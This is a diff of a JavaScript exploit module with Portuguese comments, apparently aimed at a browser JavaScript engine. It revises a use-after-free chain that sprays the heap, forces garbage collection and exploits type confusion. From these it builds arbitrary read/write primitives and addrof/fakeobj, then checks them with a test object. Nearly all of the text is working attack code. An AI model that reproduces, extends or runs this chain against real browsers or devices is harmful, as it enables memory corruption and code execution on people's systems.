@@ -1,5 +1,5 @@
-// js/script3/testArrayBufferVictimCrash.mjs (Revisão Final e Robusta)
-// Foco: Usar R/W Arbitrário para construir e validar addrof/fakeobj.
+// js/script3/testArrayBufferVictimCrash.mjs (Revisão Final com Verificação)
+// Foco: UAF robusto com verificação explícita para criar R/W e depois addrof/fakeobj.
 
 import { logS3 } from './s3_utils.mjs';
 import { AdvancedInt64 } from '../utils.mjs';
@@ -8,8 +8,8 @@ export const FNAME_MODULE = "OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R56_Anni
 
 // --- Variáveis Globais para as Primitivas ---
 let victim_array;
-let original_victim_butterfly; // Endereço do buffer de dados do victim_array
-let corrupted_container_butterfly; // O butterfly do objeto container corrompido
+let original_victim_butterfly;
+let corrupted_container_butterfly;
 
 // Funções auxiliares de conversão
 const ftoi = (val) => {
@@ -29,20 +29,14 @@ const itof = (val) => {
 
 // --- Primitivas de Leitura/Escrita Arbitrária ---
 function arb_write(where, what) {
-    // Corrompe o ponteiro do butterfly do victim_array para apontar para 'where'
     corrupted_container_butterfly[2] = itof(where.sub(8));
-    // Escreve o valor no local alvo
     victim_array[0] = itof(what);
-    // Restaura o ponteiro original para estabilidade
     corrupted_container_butterfly[2] = itof(original_victim_butterfly);
 }
 
 function arb_read(where) {
-    // Corrompe o ponteiro do butterfly do victim_array para apontar para 'where'
     corrupted_container_butterfly[2] = itof(where.sub(8));
-    // Lê o valor do local alvo
     const result = ftoi(victim_array[0]);
-    // Restaura o ponteiro original para estabilidade
     corrupted_container_butterfly[2] = itof(original_victim_butterfly);
     return result;
 }
@@ -51,44 +45,36 @@ function arb_read(where) {
 // FUNÇÃO ORQUESTRADORA PRINCIPAL
 // =======================================================================================
 export async function runExploitChain_Final() {
-    logS3(`--- Iniciando ${FNAME_MODULE}: Abordagem Final e Robusta ---`, "test");
+    logS3(`--- Iniciando ${FNAME_MODULE}: Abordagem Final com Verificação ---`, "test");
 
     try {
         // --- FASE 1: Construir Leitura/Escrita Arbitrária via UAF ---
         logS3("--- FASE 1: Forjando Primitivas de Leitura/Escrita Arbitrária ---", "subtest");
-        createArbitraryRW();
+        createArbitraryRW(); // Esta função agora inclui verificação e pode lançar um erro.
         logS3("    Primitivas de R/W Arbitrário ESTÁVEIS construídas com sucesso!", "vuln");
 
         // --- FASE 2: Construir e Validar addrof/fakeobj ---
         logS3("--- FASE 2: Construindo e Validando addrof/fakeobj ---", "subtest");
 
-        // Agora usamos o 'victim_array', cujo endereço do butterfly já conhecemos,
-        // como nossa ferramenta para criar as primitivas.
-        
         const addrof = (obj) => {
-            // Colocamos o objeto em uma posição conhecida do nosso array.
             victim_array[1] = obj;
-            // O ponteiro para 'obj' está agora em uma posição conhecida dentro do buffer do victim_array.
-            // Lemos o ponteiro diretamente desse local.
             return arb_read(original_victim_butterfly.add(8));
         };
 
         const fakeobj = (addr) => {
-            // Escrevemos o endereço falso no local do ponteiro dentro do buffer do victim_array.
             arb_write(original_victim_butterfly.add(8), addr);
-            // Ao acessar o elemento do array, o JS nos dá um objeto que aponta para o endereço falso.
             return victim_array[1];
         };
 
         logS3("    Primitivas `addrof` e `fakeobj` construídas.", "good");
 
-        // Validação das primitivas
-        const test_obj = { marker: 0xCAFEF00D };
+        // Validação
+        const test_obj = { marker: 0xDEADBEEF };
         const test_obj_addr = addrof(test_obj);
         logS3(`    Prova de Vida (addrof): Endereço do objeto de teste -> ${test_obj_addr.toString(true)}`, "leak");
         
         const fake_test_obj = fakeobj(test_obj_addr);
-        if (fake_test_obj.marker === 0xCAFEF00D) {
+        if (fake_test_obj.marker === 0xDEADBEEF) {
             logS3(`    SUCESSO! Lemos a propriedade 'marker' (valor: 0x${fake_test_obj.marker.toString(16)}) do objeto falso. Primitivas validadas!`, "vuln");
         } else {
             throw new Error(`Falha ao validar 'fakeobj'.`);
@@ -107,17 +93,26 @@ export async function runExploitChain_Final() {
 
 // --- Função que estabelece a confusão de tipos ---
 function createArbitraryRW() {
-    let spray = [];
-    for (let i = 0; i < 4096; i++) {
-        spray.push({ a: 1, b: 2, c: 3, d: 4 });
+    // Usamos uma classe para uma estrutura de objeto mais consistente
+    class SprayObject {
+        constructor() {
+            this.p0 = 0; this.p1 = 0; this.p2 = 0; this.p3 = 0;
+            this.p4 = 0; this.p5 = 0; this.p6 = 0; this.p7 = 0;
+        }
     }
-    let dangling_ref_obj = { a: 1, b: 2, c: 3, d: 4 };
+
+    let spray = [];
+    for (let i = 0; i < 8192; i++) { // Spray mais agressivo
+        spray.push(new SprayObject());
+    }
+    
+    let dangling_ref_obj = new SprayObject();
     spray.push(dangling_ref_obj);
 
     victim_array = new Float64Array([13.37, 13.38, 13.39]);
     let container = {
-        header: 0,
-        butterfly: victim_array
+        prop_A: null,
+        prop_B: victim_array // A propriedade que queremos sobrepor
     };
     
     spray = null;
@@ -128,19 +123,26 @@ function createArbitraryRW() {
         reclaimers.push(container);
     }
     
-    // A propriedade 'b' do objeto original agora se sobrepõe à propriedade 'butterfly' do container.
-    // 'dangling_ref_obj.b' nos dá acesso direto ao butterfly do container.
-    corrupted_container_butterfly = dangling_ref_obj.b;
+    // VERIFICAÇÃO CRÍTICA
+    // A propriedade 'p1' do SprayObject deve agora sobrepor a 'prop_B' do container.
+    // Verificamos se o tipo mudou de número para objeto.
+    if (typeof dangling_ref_obj.p1 !== 'object' || dangling_ref_obj.p1 === 0) {
+        // Se a verificação falhar, lançamos um erro claro em vez de deixar o exploit travar.
+        throw new Error("Falha na verificação do UAF. A confusão de tipos não ocorreu.");
+    }
+
+    // Se a verificação passou, o UAF funcionou.
+    logS3("    Verificação do UAF bem-sucedida! Confusão de tipos confirmada.", "good");
     
-    // O butterfly do container é um array de ponteiros. A posição [2] contém o ponteiro
-    // para o buffer de dados do 'victim_array'. Nós o lemos e guardamos.
+    corrupted_container_butterfly = dangling_ref_obj.p1;
     original_victim_butterfly = ftoi(corrupted_container_butterfly[2]);
 }
 
 function triggerGC() {
     try {
-        for (let i = 0; i < 64; i++) {
-            new ArrayBuffer(1024 * 1024 * 16);
+        let allocations = [];
+        for (let i = 0; i < 128; i++) {
+            allocations.push(new ArrayBuffer(1024 * 1024 * 8)); // Aloca 1GB no total para forçar GC
         }
     } catch(e) {}
 }
